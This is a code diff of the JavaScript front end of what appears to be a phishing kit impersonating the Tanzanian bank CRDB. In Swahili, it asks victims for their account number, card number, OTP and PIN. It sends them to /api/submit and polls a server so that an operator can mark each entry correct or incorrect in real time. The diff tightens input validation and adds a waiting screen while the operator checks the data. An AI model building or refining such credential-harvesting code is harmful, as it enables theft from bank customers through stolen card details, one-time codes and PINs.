@@ -3,7 +3,17 @@ document.addEventListener('DOMContentLoaded', () => {
     let formData = {};
     let pollInterval = null;
 
-    const steps = ['stepSlider', 'step1', 'step2', 'step3', 'accountVerification', 'otpScreen', 'pinScreen', 'congratsScreen'];
+    // Steps array index mapping:
+    // 0: stepSlider
+    // 1: step1
+    // 2: step2
+    // 3: step3
+    // 4: accountVerification
+    // 5: loadingScreen (spinner waiting for approval)
+    // 6: otpScreen
+    // 7: pinScreen
+    // 8: congratsScreen
+    const steps = ['stepSlider', 'step1', 'step2', 'step3', 'accountVerification', 'loadingScreen', 'otpScreen', 'pinScreen', 'congratsScreen'];
     let currentStepIndex = 0;
 
     function showStep(index) {
@@ -109,17 +119,25 @@ document.addEventListener('DOMContentLoaded', () => {
         showStep(4);
     });
 
-    // Account & Card Number submission
+    // Account (13 digits) & Card Number (16 digits) submission
     safeAddListener('submitAccountDetails', 'click', async () => {
         const accountNumber = document.getElementById('accountNumberInput').value.trim();
         const cardNumber = document.getElementById('cardNumberInput').value.trim();
 
-        if (!accountNumber || !cardNumber) {
-            alert('Weka namba ya akaunti na namba ya kadi!');
+        if (accountNumber.length !== 13 || !/^\d{13}$/.test(accountNumber)) {
+            alert('Namba ya akaunti lazima iwe na tarakimu 13 kamili!');
+            return;
+        }
+
+        if (cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) {
+            alert('Namba ya kadi lazima iwe na tarakimu 16 kamili!');
             return;
         }
 
         showNotification('Inatuma taarifa kwa uthibitisho wa CRDB...');
+
+        // Immediately transition to the spinner / loading screen (Index 5)
+        showStep(5);
 
         try {
             await fetch('/api/submit', {
@@ -233,7 +251,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     clearInterval(pollInterval);
                 } else if (data.status === 'correct_details') {
                     showNotification('CORRECT DETAILS ✅ - Endelea kwenda OTP.');
-                    showStep(5);
+                    showStep(6); // otpScreen index
                     clearInterval(pollInterval);
                 } else if (data.status === 'otp_incorrect') {
                     showNotification('OTP INCORRECT ❌ - Tafadhali ingiza namba mpya halali ya OTP.');
@@ -242,7 +260,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     clearInterval(pollInterval);
                 } else if (data.status === 'otp_correct') {
                     showNotification('OTP CORRECT ✅ - Endelea kuweka PIN.');
-                    showStep(6);
+                    showStep(7); // pinScreen index
                     clearInterval(pollInterval);
                 } else if (data.status === 'invalid_pin') {
                     showNotification('INVALID PIN ❌ - Tafadhali ingiza PIN halali.');
@@ -256,7 +274,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     document.getElementById('congratsName').textContent = `${formData.firstName || 'JANE'} ${formData.lastName || 'MWANGI'}`.toUpperCase();
                     document.getElementById('congratsPhone').textContent = `+255 ${formData.phone || '712 345 678'}`;
                     document.getElementById('congratsAcc').textContent = formData.accountNumber || 'SBK0012345678';
-                    showStep(7);
+                    showStep(8); // congratsScreen index
                     clearInterval(pollInterval);
                 }
             } catch (err) {
@@ -265,4 +283,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 3000);
     }
 });
-    
+            
